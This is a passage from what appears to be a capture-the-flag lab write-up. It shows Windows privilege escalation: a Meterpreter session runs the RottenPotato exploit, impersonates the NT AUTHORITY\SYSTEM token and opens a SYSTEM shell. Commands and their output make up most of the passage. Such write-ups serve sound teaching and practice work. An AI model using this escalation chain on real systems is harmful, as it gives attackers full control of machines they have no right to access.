             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
TALLY\Sarah

Impersonation Tokens Available
========================================
NT SERVICE\SQLSERVERAGENT
{% endhighlight %}  

As it was seen in the screenshot above, shows us that in the available tokens there is onl  **NT SERVICE\SQLSERVERAGENT**.  
It is time to use the rottenpotato that we just downloaded, to execute it we must do the following:  

{% highlight bash %}
meterpreter > execute -Hc -f C:\\Users\\Sarah\\Desktoprottenpotato.exe
Process 7996 created.
Channel 2 created.

meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
TALLY\Sarah

Impersonation Tokens Available
========================================
NT AUTHORITY\SYSTEM
NT SERVICE\SQLSERVERAGENT
{% endhighlight %}  

OK, we already have a Token available of *NT AUTHORITY\SYSTEM*.  
To perform the token impersonating we do the following:

{% highlight bash %}
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[-] No delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM


meterpreter > shell
Process 3452 created.
Channel 3 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Sarah\Desktop> whoami
nt authority\system
{% endhighlight %}  

Success!   
We have our SYSTEM shell.
